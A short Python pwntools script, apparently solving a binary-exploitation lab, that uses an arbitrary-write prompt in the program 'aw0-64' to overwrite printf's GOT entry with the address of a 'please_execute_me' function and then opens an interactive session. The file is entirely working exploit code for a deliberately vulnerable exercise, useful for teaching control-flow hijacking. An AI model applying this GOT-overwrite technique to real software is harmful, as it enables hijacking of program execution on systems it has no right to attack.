#!/usr/bin/env python3

from pwn import *
from pwn import ELF, info, p64, process

program_name = "./aw0-64"
elf = ELF(program_name)

program = f"/usr/local/pin/pin -t obj-intel64/part3.so -- {program_name}"

p = process(
    program.split(),
    env={"PATH": ".:/bin:/usr/bin"},
)

printf_got = elf.got["printf"]
target_address = elf.symbols["please_execute_me"]
info("target: " + hex(target_address))

# "How many bytes do you want to write (N, in decimal, max 128 bytes)?"
print(p.recvuntil("bytes)?\n"))
p.sendline("6")

# "What is the address that you want to write (A, in hexadexmial, e.g., 0xffffde01)?"
print(p.recvuntil(")?\n"))
p.sendline(hex(printf_got))

# "Please provide your input (MAX %d bytes)\n",
print(p.recvuntil("bytes)\n"))
p.sendline(p64(target_address))

p.interactive()
